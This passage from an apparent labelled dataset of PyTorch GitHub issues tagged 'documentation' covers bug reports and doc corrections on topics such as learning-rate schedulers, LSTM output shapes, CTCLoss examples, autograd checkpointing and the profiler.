like:\r\n\r\n```python\r\n\"\"\"Step should be called after every time a batch is processed in addition to after each epoch,\r\n   like in the following example:\r\n\r\n         >>> scheduler = CosineAnnealingWarmRestarts(optimizer, T_0, T_mult)\r\n         >>> for epoch in range(N):\r\n         >>>     scheduler.step(epoch)\r\n         >>>     for inputs, labels in trainloader:\r\n         >>>         optimizer.zero_grad()\r\n         >>>         outputs = net(inputs)\r\n         >>>         loss = criterion(outputs, labels)\r\n         >>>         loss.backward()\r\n         >>>         optimizer.step()\r\n         >>>         scheduler.step()\r\n\"\"\"\r\n```\r\n\r\nIs this correct? Or have I misinterpreted how to apply this function?\r\n\r\nThanks for the great work and please let me know if I can help in some way."},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/docs/stable/nn.html?highlight=attention#torch.nn.MultiheadAttention\r\n\r\nThe docstring for the inputs and outputs of nn.MultiheadAttention are broken since they are in the wrong format. They also light on description of each input.\r\n\r\n They display for inputs as,\r\nquery: [target length, batch size, embed dim] key: [sequence length, batch size, embed dim] value: [sequence length, batch size, embed dim] key_padding_mask: if True, mask padding based on batch size incremental_state: if provided, previous time steps are cashed need_weights: output attn_output_weights static_kv: key and value are static\r\n\r\nand for outputs as.\r\nattn_output: [target length, batch size, embed dim] attn_output_weights: [batch size, target length, sequence length]\r\n"},{"labels":[null,"documentation",null,null],"text":"PyTorch 1.0.1 documentation for `geometric` defines it as [*f(X = k) = (1 - p)^(k - 1)p*](https://pytorch.org/docs/stable/tensors.html#torch.Tensor.geometric_) whereas the inline comment in the code defines it as [*p(i) = (1 - p)p^(i - 1)*](https://github.com/pytorch/pytorch/blob/83221655a8237ca80f9673dad06a98d34c43e546/aten/src/TH/THRandom.h#L74)."},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nAfter initializing a tensor with `requires_grad=True`, applying a view, summing, and calling backward, the gradient is None. This is not the case if the tensor is initialized using the dimensions specified in the view.\r\n\r\n## To Reproduce\r\n```\r\nimport torch\r\n\r\n# test without view\r\nX = torch.tensor([[[0.25]],[[ 0.75]]],requires_grad=True,)\r\nprint(f\"X.shape: {X.shape}\")\r\nX.sum().backward()\r\nprint(f\"X.grad: {X.grad}\")\r\n\r\n# test with view\r\nX_view = torch.tensor([0.25, 0.75], requires_grad=True,).view(2, 1, 1)\r\nprint(f\"X_view.shape: {X_view.shape}\")\r\nX_view.sum().backward()\r\nprint(f\"X_view.grad: {X_view.grad}\")\r\nprint(f\"X_view.grad is None: {X_view.grad is None}\")\r\n```\r\n\r\nOutput\r\n```\r\nX.shape: torch.Size([2, 1, 1])\r\nX.grad: tensor([[[1.]],\r\n\r\n        [[1.]]])\r\nX_view.shape: torch.Size([2, 1, 1])\r\nX_view.grad: None\r\nX_view.grad is None: True\r\n```\r\n\r\n\r\n## Expected behavior\r\n\r\nGrad is not None and `X.grad` is the same as `X_view.grad`\r\n## Environment\r\nCollecting environment information...\r\nPyTorch version: 1.0.0a0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.2.88\r\n\r\nOS: CentOS Linux 7 (Core)\r\nGCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-28)\r\nCMake version: Could not collect\r\n\r\nPython version: 3.6\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip] Could not collect\r\n[conda] Could not collect\r\n"},{"labels":["documentation",null,null],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n`torch.nn.functional.grid_sample(input, grid, mode='bilinear', padding_mode='zeros')`,  \r\n \r\nthe bug is conerned on the **padding mode**. By default, `padding_mode='zeros'` means when values of the grid are out of [-1,1], then those values of the grid are setting to be 0. However, this default padding mode changes the values of **the input** when values of the corresponding position in the grid are out of [-1,1]. \r\n## To Reproduce \r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Prepare a sample image A(make sure its minimum value of pixels are greater than 0), generate a tensor of the grid(making some values out of [-1,1], the same size of A).\r\n1. Use `torch.nn.functional.grid_sample` to warp A by the generated grid(use `padding_mode='zeros'`) to achieve B.\r\n1. print the maximum and the minimum value of the pixels in A and B.  \r\n\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\nThen the minimum value of B is 0, which is incorrect.\r\n## Environment\r\n - PyTorch Version : 1.0\r\n - OS: linux\r\n - How you installed PyTorch (`conda`, `pip`, source): conda\r\n - Python version: 3.6.4\r\n - CUDA/cuDNN version: 10.0\r\n - GPU models and configuration: \r\n"},{"labels":["documentation",null,null],"text":"**Documentation issue**\r\n\r\nIn the [documentation](https://pytorch.org/docs/stable/nn.html#lstm) of PyTorch 1.0.1. It is mentioned that:\r\n\r\n> batch_first ‚Äì If True, then the input and output tensors are provided as (batch, seq, feature). Default: False\r\n\r\nSo I would expect the ouput tensor h_n of shape: (batch, num_layers * num_directions, hidden_size). But it is not the case. The batch is the second dimension, which does not match with the above statement from the documentation.\r\n \r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n\r\n```\r\ninput = torch.rand([60, 8, 256]) #batch size is 60, sequence size is 8, features are 256\r\nlstm = torch.nn.LSTM(256, 512, batch_first=True)\r\n_, (finalHiddenState, _) = lstm(input)\r\nprint(finalHiddenState.shape)\r\nOuput: torch.Size([1, 60, 512]) \r\n```\r\nBatch (60) is now the second dimension here"},{"labels":["documentation",null],"text":"Currently the [torch.set_flush_denormal docs](https://pytorch.org/docs/stable/torch.html?highlight=set_flush_denormal#torch.set_flush_denormal) do not mention what is the default mode.\r\n\r\nIt would also be nice if they mentioned the FTZ / DAZ flags and a link to some reference page (like [intel's](https://software.intel.com/en-us/cpp-compiler-developer-guide-and-reference-setting-the-ftz-and-daz-flags)?) - like that this method would show up for google queries like `pytorch ftz`.\r\n\r\nAlso, a note on whether denormals are flushed [on GPU](https://devblogs.nvidia.com/cuda-pro-tip-flush-denormals-confidence/) would be helpful."},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nUntil very recently, I had never understood when async copying is safe. \r\n\r\nWe should document the exact behaviors about async computing, including:\r\n\r\n+ copying:\r\n  + Async device2device: the stream synchronization behavior. device2device is always async, regardless of `non_blocking` (IIUC).\r\n  + Async device2host copy: danger of accessing CPU data without synchronization when host is pinned memory.\r\n  + Async pinned host2device copy: \r\n     Always safe.\r\n  + Async pageable host2device copy:\r\n    This is also safe. See @colesbury 's reply below.\r\n\r\n+ General compute with streams\r\n  + GC behavior when computing in S1 on tensors created in S0. Document `tensor.record_stream` please!"},{"labels":["documentation",null,null],"text":"## üêõ Bug\r\nThis is a simple one:  The documentation for torch.nn.CrossEntropyLoss states that it works for K-dimensional loss where K >= 2.  Reading the documentation I was expecting K=1 to fail, however the code handles K=1 just fine.\r\n\r\nIt looks like the issue might not be isolated to CrossEntropyLoss.  I'm thinking at minimum the documentation for CrossEntropyLoss, NLLLoss, nll_loss, and cross_entropy all have the bounds wrong for the multi-dimensional case.  The functional losses (nll_loss and cross_entropy) have the bounds right for target but wrong for input.\r\n\r\nIf there's an agreement that these four cases should be updated, then I'll be happy to submit a PR.\r\n\r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"In https://pytorch.org/docs/stable/torch.html#torch.potri, the provided example will not work, because [`torch.cholesky`](https://pytorch.org/docs/stable/torch.html#torch.cholesky) spits out the lower-triangular `l` by default, whereas `torch.potri` takes the upper-triangular `u` by default.\r\n\r\nThe example should be fixed to explicitly make the `upper` param the same in both the `torch.potri` and `torch.cholesky` calls.\r\n\r\nAs a further note, I believe that the default for `upper` should be the same between the two, in anycase. My recommendation is because `potri`, `potrs`, and all the other such functions default to `upper=True`, `cholesky` should bend the knee and also be `upper=True` by default to keep things standardized."},{"labels":[null,null,"documentation",null,null],"text":"## üöÄ Feature\r\n\r\n`torch.autograd.profiler.profile().export_chrome_trace` is great. Adding information to it from Python would make it even better.\r\n\r\n## Motivation\r\n\r\nIn multi-threaded PyTorch code, it can be useful to further annotate the tracing output by adding additional information to it.\r\n\r\n## Pitch\r\n\r\nOne easy / cheap way of doing this:\r\n\r\n```cc\r\nPYBIND11_MODULE(torch, m) {\r\n  py::class_<torch::autograd::profiler::RecordFunction>(m, \"Record\")\r\n      .def(py::init<std::string>(), py::arg(\"name\"));\r\n}\r\n```\r\n\r\nAnd then in Python\r\n\r\n```python\r\nrecord = torch.Record(\"model\")\r\noutputs = model(frame)\r\ndel record  # Alternatively, turn it into a context manager.\r\n```\r\n"},{"labels":[null,null,null,"documentation",null],"text":"## üöÄ Feature\r\nThe context manager `torch.autograd.profiler.profile()` enables profiling by calling `torch.autograd._enable_profiler()` and `torch.autograd._disable_profiler()`.\r\n\r\nEnabling/disabling this profiling on the fly should be fully supported. Right now exporting chrome traces as json breaks when calling _enable and _disable directly while training happens in another thread. (The `pop()` call in https://github.com/pytorch/pytorch/blob/master/torch/autograd/profiler.py#L465 can then happen on an empty list.)\r\n\r\nWhile we're at it, building the Chrome tracing json file in Python has significant overhead and it seems reasonable to move that code into C++.\r\n\r\nIt also seems reasonable to export a gzipped json file, as Chrome can deal with those directly.\r\n\r\n(It might also be worth investigating whether running an http server alongside PyTorch which displays tracing information on demand is something we could support. Other popular ML frameworks do that.)\r\n\r\n## Motivation\r\n\r\nIn situations in which (1) there's many op executions and (2) the profiled code needs a certain burn-in time, the json file resulting from calling `export_chrome_trace()` can get many GB large. Building these large json files in Python takes a long time, and Chrome runs OOM when you try to load them.\r\n\r\nManually enabling/disabling profiling while other threads run PyTorch ops also breaks building the json traces as described above.\r\n\r\n## Pitch\r\n\r\n```python\r\ntorch.autograd.profiler.enable()\r\ntime.sleep(10)\r\nprof = torch.autograd.profiler.disable()\r\nprof.export_chrome_trace(\"tracefile.json.gz\")  # Not in Python; fast.  \r\n```\r\n\r\n## Alternatives\r\n\r\nNone what. so. ever.\r\n"},{"labels":[null,null,null,"documentation",null,null,null],"text":"According to @t-vi and Clement Pinard, PackedTensorAccessor is slower than THCDeviceTensor because it does 64-bit indexing, and 32-bit indexing can be quite a bit faster on CUDA. We should support it as an option (with documentation about how to properly test if you can use 32-bit indexing or not.)\n\ncc @ezyang @gchanan"},{"labels":[null,"documentation",null,null],"text":"The `nn.SyncBatchNorm`'s example mentions `torch.nn.utils.convert_sync_batchnorm`, `torch.nn.SyncBatchNorm.convert_sync_batchnorm`'s example mentions some global `convert_sync_batchnorm`, while both should mention `torch.nn.SyncBatchNorm.convert_sync_batchnorm` if I understand it right\r\n\r\nMaybe there can be created some special markup about some specific examples (not all of them) that would enable them to be executed as tests, then simple mistakes like this wouldn't happen."},{"labels":[null,null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/docs/master/torch.html#torch.cumprod doesn't show `out=` option."},{"labels":[null,"documentation",null,null,null],"text":"## üìö Documentation\r\n\r\nThe link to the under https://pytorch.org/docs/stable/nn.html#tripletmarginloss  pointing to the paper Learning shallow convolutional feature descriptors with triplet losse is broken. Currently its pointing to http://www.iis.ee.ic.ac.uk/~vbalnt/shallow_descr/TFeat_paper.pdf , but that link is dead. Maybe use http://www.bmva.org/bmvc/2016/papers/paper119/paper119.pdf ?\r\n"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\n```python\r\nclass PairwiseDistance(Module):\r\n    r\"\"\"\r\n    Computes the batchwise pairwise distance between vectors :math:`v_1`, :math:`v_2` using the p-norm:\r\n\r\n    .. math ::\r\n        \\Vert x \\Vert _p := \\left( \\sum_{i=1}^n  \\vert x_i \\vert ^ p \\right) ^ {1/p}\r\n\r\n    Args:\r\n        p (real): the norm degree. Default: 2\r\n        eps (float, optional): Small value to avoid division by zero.\r\n            Default: 1e-6\r\n        keepdim (bool, optional): Determines whether or not to keep the batch dimension.\r\n            Default: False\r\n\r\n    Shape:\r\n        - Input1: :math:`(N, D)` where `D = vector dimension`\r\n        - Input2: :math:`(N, D)`, same shape as the Input1\r\n        - Output: :math:`(N)`. If :attr:`keepdim` is ``False``, then :math:`(N, 1)`.\r\n\r\n    Examples::\r\n\r\n        >>> pdist = nn.PairwiseDistance(p=2)\r\n        >>> input1 = torch.randn(100, 128)\r\n        >>> input2 = torch.randn(100, 128)\r\n        >>> output = pdist(input1, input2)\r\n    \"\"\"\r\n```\r\n\r\nhere I think\r\n> - Output: :math:`(N)`. If :attr:`keepdim` is ``False``, then :math:`(N, 1)`.\r\n\r\nshould be \r\n\r\n> - Output: :math:`(N)`. If :attr:`keepdim` is ``True``, then :math:`(N, 1)`.\r\n\r\nand\r\n\r\n> keepdim (bool, optional): Determines whether or not to keep the batch dimension.\r\n\r\nhere it is not about the batch dimension but the representation dimension.\r\n"},{"labels":["documentation",null],"text":"Tensorflow has Tensorflow Serving. How do people serve models trained with pytorch. \r\nI see Pytorch has `save` and `load` API. Is there any standard way to server trained model using PyTorch?  \r\n"},{"labels":[null,null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nThe [`torch.autograd.enable_grad` documentation](https://pytorch.org/docs/stable/autograd.html#torch.autograd.enable_grad) says:\r\n\r\n> Enables gradient calculation inside a `no_grad` context. This has no effect outside of `no_grad`.\r\n\r\nThis implies:\r\n```\r\n    torch.set_grad_enabled(False)\r\n    with torch.enable_grad:\r\n        # Gradient tracking will NOT be enabled here.\r\n    torch.set_grad_enabled(True)\r\n\r\nvs:\r\n\r\n    with torch.no_grad():\r\n        with torch.enable_grad:\r\n            # Gradient tracking IS enabled here.\r\n```\r\n \r\nHowever the observed behaviour (`1.0.1.post2`) is:\r\n\r\n```\r\nx = torch.tensor([.1], requires_grad=True)\r\n\r\nwith torch.no_grad():\r\n    with torch.enable_grad():\r\n        y = x * 2\r\nprint(y.requires_grad) # True (as expected)\r\n\r\nwith torch.set_grad_enabled(False):\r\n    y = x * 2\r\nprint(y.requires_grad)  # False (as expected)\r\n\r\nwith torch.set_grad_enabled(False):\r\n    with torch.enable_grad():\r\n        y = x * 2\r\n        print(y.requires_grad)  # True, but False expected from doc quote\r\n```\r\n\r\nNote the last example is not \"inside a `no_grad` context\", but it still works.\r\n\r\nOther prior art: [PyTorch set_grad_enabled(False) vs with no_grad():](https://stackoverflow.com/a/53447634/5353461)\r\n\r\n-----------\r\n\r\nI'm assuming the documentation is incorrect, and it should say simply:\r\n\r\n> Enables gradient calculation.\r\n\r\nWould you accept a PR?"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n`model.eval()`  and `with torch.no_grad` are both commonly used in evaluating a model.\r\n\r\n[Confusion exists about whether setting `model.eval()` also sets `autograd.no_grad`](https://discuss.pytorch.org/t/does-model-eval-with-torch-set-grad-enabled-is-train-have-the-same-effect-for-grad-history/17183/5?u=ataraxy)\r\n\r\nWould you accept a PR which suggests usage of the other, with words like:\r\n\r\n* If evaluating a model's performance, using Module.eval() may also be useful.\r\n* If evaluating a model's performance, using autograd.no_grad may also be useful."},{"labels":["documentation",null,null],"text":"TODO after https://github.com/pytorch/pytorch/pull/18649 series merged."},{"labels":[null,"documentation",null,null,null],"text":"It's pretty ridiculous that, for a 1D input like `x = torch.rand(5)`, `torch.logsumexp` still requires you to specify you're operating over dimension 0.\r\n\r\nIn particular `torch.logsumexp(x)` will error, saying that it needs a dim argument. `torch.logsumexp(x, 0)` works.\r\n\r\nMy suggestion is that, at the very least for 1D inputs, the default dim you operate over is set to 0. This is a problem for `logsumexp` and `cumsum`, just to name two."},{"labels":[null,null,null,"documentation",null,null],"text":"## üöÄ Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\n\r\nI am building an application where there's basically a producer and a consumer of `std::tuple<torch::Tensor, torch::Tensor>`s.\r\n\r\nThe producer has to run a neural network to produce the tensors, and the consumer has to train from the output of the producer, occasionally checkpoint to file, which the producer then occasionally reads and updates its own network with the new one. (I'm implementing Alpha Zero)\r\n\r\nThe only problem is, it seems like pytorch is not thread safe in this regard. Even when I assign two separate (but identical) networks to producer and consumer, I get an error when I run the two concurrently.\r\n\r\nTherefore, I'm trying to separate the two as processes. I'm trying to use a message queue so that the producer can send its output to the consumer. However, now I don't know how to serialize `torch::Tensor`s. I think it should be doable with `torch::serialize::InputArchive` and `torch::serialize::OutputArchive`, but the C++ API reference wasn't too kind for me to understand.\r\n\r\nSince I wasn't too sure if this is doable or not, I decided to submit as a feature request.\r\n"},{"labels":[null,null,"documentation",null,null,null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation",null,null],"text":"## üêõ Bug\r\n\r\nWhen using `.unfold` method of `torch.Tensor`, keyword argument `dim` doesn't work: only `dimension` works.\r\n\r\n## To Reproduce\r\n\r\n```\r\n>>> x = torch.randn(34)\r\n>>> y = x.unfold(dim=0, size=10, step=5)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: unfold() missing 3 required positional argument: \"dimension\", \"size\", \"step\"\r\n>>> y = x.unfold(dimension=0, size=10, step=5)\r\n>>> y.shape\r\ntorch.Size([5, 10])\r\n```\r\n\r\n## Environment\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.0.1\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.0.176\r\n\r\nOS: CentOS Linux 7 (Core)\r\nGCC version: (GCC) 5.3.0\r\nCMake version: version 3.13.3\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 9.0.176\r\nGPU models and configuration: \r\nGPU 0: GeForce GTX 1080\r\nGPU 1: GeForce GTX 1080\r\n\r\nNvidia driver version: 410.79\r\ncuDNN version: Probably one of the following:\r\n/usr/local/cuda-10.0/targets/x86_64-linux/lib/libcudnn.so.7\r\n/usr/local/cuda-9.0/targets/x86_64-linux/lib/libcudnn.so.5\r\n/usr/local/cuda-9.0/targets/x86_64-linux/lib/libcudnn.so.7\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.15.4\r\n[pip3] torch==1.0.1\r\n[pip3] torchsummary==1.5.1\r\n[pip3] torchvision==0.2.1\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.1                      144  \r\n[conda] mkl-service               1.1.2            py37he904b0f_5  \r\n[conda] mkl_fft                   1.0.6            py37hd81dba3_0  \r\n[conda] mkl_random                1.0.2            py37hd81dba3_0\r\n```"},{"labels":[null,null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nWhen setting TORCH_CUDA_ARCH_LIST=All, I expect Torch to compile with all CUDA architectures available to my current version of CUDA. Instead, it attempted to build for cuda 2.0.\r\n\r\nSee error:\r\nnvcc fatal   : Unsupported gpu architecture 'compute_20'\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Install CUDA >= 9.0\r\n2. TORCH_CUDA_ARCH_LIST=All cmake -DUSE_CUDA=ON ..\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\nFilters out 2.x architectures if CUDA >= 9.0\r\n\r\n## Environment\r\nCUDA 10.1"},{"labels":[null,null,"documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nOn https://pytorch.org/tutorials/advanced/cpp_frontend.html and https://pytorch.org/cppdocs/frontend.html, the code that includes the pytorch library should be `#include <torch/script.h>`, not `#include <torch/torch.h>`."},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nI have a Pytorch C++ frontend (LibTorch) based deployment codebase. I am trying to add profiling support to it. I am thinking of using autograd profiler for it, which seems to be the best option as far as getting layer-by-layer timings is concerned.\r\nI recently saw a change getting pushed in which enables access to the autograd profiler from the C++ frontend (https://github.com/pytorch/pytorch/pull/16580). Is there any documentation for its usage ? Or some sort of a primer...?"},{"labels":[null,null,"documentation",null],"text":"## üêõ Bug\r\n\r\nWhen the autograd graph has parallel lanes, and a checkpointing is on one of the lanes, the checkpointing evaluates irrelevant backwards on another lane.\r\n\r\nFor example, if our autograd graph looks like:\r\n```\r\n          +--> Eval1\r\nSum --> Cat\r\n          +--> Checkpoint(Eval2)\r\n```\r\n\r\nThe backward of `Checkpoint(Eval2)` evaluates the backward of `Eval1` recursively.\r\n\r\nIt's not an expected behavior because there's no any dependency between them. `Eval1` should be evaluated AFTER `Checkpoint(Eval2)`.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Make parallel lanes in an autograd graph.\r\n1. Use `torch.utils.checkpoint.checkpoint` on the one of the lanes.\r\n1. Insert logs or a race condition to detect the recursion.\r\n\r\nLet me show you. Following `Log` function will record the forward and backward event into `timeline`:\r\n```python\r\ntimeline = []\r\nclass Log(torch.autograd.Function):\r\n    @staticmethod\r\n    def forward(ctx, x, name):\r\n        ctx.name = name\r\n        timeline.append('%s:forward' % name)\r\n        return x\r\n    @staticmethod\r\n    def backward(ctx, grad_output):\r\n        name = ctx.name\r\n        timeline.append('%s:backward' % name)\r\n        return grad_output, None\r\n```\r\n\r\nNow make an autograd graph like what I attached at the top:\r\n```python\r\na = torch.rand(1, requires_grad=True)\r\nb = torch.rand(1, requires_grad=True)\r\n\r\na = Log.apply(a, 'a')\r\nb = checkpoint(lambda b: Log.apply(b, 'b'), b)\r\nout = torch.cat((a, b)).sum()\r\n\r\n#                 +--> Log[a] --> a\r\n# Sum --> Cat[a, b]\r\n#                 +--> Checkpoint(Log[b]) --> b\r\nout.backward()\r\n```\r\n\r\nNow check `timeline` to detect the recursion. We can see that the backward of `Log[a]` is evaluated in the backward of `Checkpoint(Log[b])`:\r\n```python\r\n>>> print(timeline)\r\n['a:forward', 'b:forward', 'b:forward', 'a:backward', 'b:backward']\r\n>>> # forward pass -----|  |            |- Log[a] -|             |\r\n>>> #                      |--------- Checkpoint(Log[b]) --------|\r\n```\r\n\r\n## Expected behavior\r\n\r\nIn my reproducing code, `timeline` should follow the below order because there's no dependency between `Checkpoint(Log[b])` and `Log[a]`:\r\n```python\r\nassert timeline == \\\r\n    ['a:forward', 'b:forward', 'b:forward', 'b:backward', 'a:backward']\r\n#    |----------------------|  |-----------------------|  |----------|\r\n#          forward pass            Checkpoint(Log[b])        Log[a]\r\n```\r\n\r\nI read `autograd/engine.cpp` including the `[Reentrant backwards]` note. If my understanding is correct, nested backwards should evaluate only the tasks which it queued. Because of a specified `graph_task` and the sorting rule of `ReadyQueue`.\r\n\r\n## Environment\r\n\r\nI reproduced it on ffc7158bf2f97916305217e4203ef846c00161ce (`master`) and bb15580e88cc963df22eab291fbe182f42426ad5 (v1.0.1).\r\n```\r\nPyTorch version: N/A\r\nIs debug build: N/A\r\nCUDA used to build PyTorch: N/A\r\n\r\nOS: Ubuntu 16.04.5 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609\r\nCMake version: version 3.14.0\r\n\r\nPython version: 3.6\r\nIs CUDA available: N/A\r\nCUDA runtime version: 9.0.176\r\nGPU models and configuration:\r\nGPU 0: Tesla V100-SXM2-32GB\r\nGPU 1: Tesla V100-SXM2-32GB\r\nGPU 2: Tesla V100-SXM2-32GB\r\nGPU 3: Tesla V100-SXM2-32GB\r\n\r\nNvidia driver version: 396.44\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.4.1\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.2\r\n[conda] blas                      1.0                         mkl\r\n[conda] magma-cuda90              2.5.0                         1    pytorch\r\n[conda] mkl                       2019.3                      199\r\n[conda] mkl-include               2019.3                      199\r\n[conda] mkl_fft                   1.0.10           py36ha843d7b_0\r\n[conda] mkl_random                1.0.2            py36hd81dba3_0\r\n```\r\n\r\n## Additional context\r\n\r\nI think https://github.com/pytorch/pytorch/issues/6959 is related with this issue. As @shubhtuls said, there's no reason for checkpointing to rely on nested recursions."},{"labels":["documentation"],"text":"https://pytorch.org/docs/master/torch.html#torch.arange and https://pytorch.org/docs/master/torch.html#torch.range say that they uses the default floating point dtype, but the default dtype is `int64`"},{"labels":["documentation",null,null],"text":"Reported by @jph00\r\n\r\n> new_tensor is a legacy constructor and is not supported in the JIT\r\n\r\nIt'd be helpful to know in the error message what the non-legacy alternative is."},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\nAnother student and I have been working out how to use the new CTCLoss function, and the documentation is somewhat incomplete. I want to point out some possible problems, and suggest changes to the example script.\r\n\r\nProblems:\r\n  - **S** is not defined for the shape of `targets`. S should be the length of the targets?\r\n  - It appears that each value in **S** should be the index of the target, similar to CrossEntropy loss, but this is not explained\r\n  - For the example code, why would the target indices start at 1 instead of 0?\r\n  - `sum(target_lengths)` is not clear\r\n  - For the example code, variables are not named in terms of **S,N,T,C**\r\n  - It is unclear why `target_lengths` would ever need to contain values less than the true length of the target sequences, and it appears that \"length\" is actually the stop index? (in the example) I assume there is some intended reason for this, but it is a bit confusing why lengths are specified separately from the sequences themselves.\r\n\r\nA possible improvement of the example script might look something like this (`x` and `y` could be replaced with `input` and `target`)\r\n\r\n```\r\nfrom torch import nn\r\nimport torch\r\n\r\n\r\nT = 50  # Input sequence length\r\nC = 20  # Number of classes\r\nN = 16  # Batch size\r\nS = 30  # Target sequence length\r\n\r\nminimum_target_length = 10\r\n\r\nctc_loss = nn.CTCLoss()\r\nx = torch.randn(T, N, C).log_softmax(2).detach().requires_grad_()    # [size] = T,N,C\r\ny = torch.randint(1, C, (N, S), dtype=torch.long)                    # low, high, [size]\r\n\r\nx_lengths = torch.full((N,), T, dtype=torch.long)                           # Length of inputs\r\ny_lengths = torch.randint(minimum_target_length,S,(N,), dtype=torch.long)   # Length of targets can be variable (even if target sequences are constant length)\r\n\r\nloss = ctc_loss(x, y, x_lengths, y_lengths)\r\nloss.backward()\r\n\r\nprint(\"x.shape\", x.shape)\r\nprint(\"y.shape\", y.shape)\r\nprint(\"x_lengths\", x_lengths)\r\nprint(\"y_lengths\", y_lengths)\r\n\r\nprint(loss)\r\n```\r\n\r\nHopefully this would save people some time figuring out the currently unstated requirements of CTCLoss.\r\n\r\ncredit to @Jacob0G for helping find some of these issues"},{"labels":[null,null,null,"documentation",null],"text":"## ‚ùì Questions and Help\r\n\r\n### Please note that this issue tracker is not a help form and this issue will be closed.\r\n\r\nWe have a set of [listed resources available on the website](https://pytorch.org/resources). Our primary means of support is our discussion forum:\r\n\r\n- [Discussion Forum](https://discuss.pytorch.org/)\r\n\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen @yf225"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\nThe documentation in https://pytorch.org/docs/stable/torch.html#torch.addcmul seem to suggest that the precedence for the operators are as follows\r\n\r\nout = tensor + value * (tensor1 * tensor2)\r\n\r\nIs that correct? In general, since floating point operators do not commute, could the precedence for addcmul and addcdiv be clarified? Such information is important for numerical troubleshooting.\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nI find the sentence: \r\n\r\n> This criterion expects a class index (0 to C-1) as the target\r\n\r\nmisleading.\r\n\r\nAn exception should be mentionned for the value of `ignore_index`. If my understanding is correct, any value is allowed for `ignore_index`, which will then be allowed as a value in `target`.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation"],"text":"Jupyter notebooks which can be downloaded at tutorial pages (ex. https://pytorch.org/tutorials/beginner/blitz/tensor_tutorial.html) contain wrong notations as described below.\r\n\r\n```\r\nConverting NumPy Array to Torch Tensor\r\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\nSee how changing the np array changed the Torch Tensor automatically\r\n```\r\n\r\nThis is rendered on jupyter notebook as below.\r\n\r\n![image](https://user-images.githubusercontent.com/25898373/53683913-06a71c00-3d4a-11e9-8cfa-d36146729862.png)\r\n\r\n`###` can be used instead, I think.\r\n\r\nExample: https://pytorch.org/tutorials/_downloads/3c2b25b8a9f72db7780a6bf9b5fc9f62/tensor_tutorial.ipynb\r\n\r\nRegards."},{"labels":[null,null,"documentation",null],"text":"## üìö Documentation\r\n\r\nI am interested in the following workflow, but my impression is that this use case is not supported (yet?):\r\n\r\n1. Prototype a model in **Python**\r\n2. Export model to **C++** via TorchScript (`torch.jit.trace`)\r\n3. Train model in **C++**\r\n\r\nBased on the documentation, it is unclear whether this workflow is supported or not. The very first sentence of https://pytorch.org/docs/master/jit.html states\r\n\r\n> TorchScript is a way to create serializable and **optimizable models** from PyTorch code\r\n\r\nHowever, it is ambiguous if \"**optimizable**\" refers to training or the jit compilation process here. \r\n\r\nIt seems that `torch::jit::script::Module` is treated as a special case which does not share commonality / a base class with `torch::nn::Module`. Is 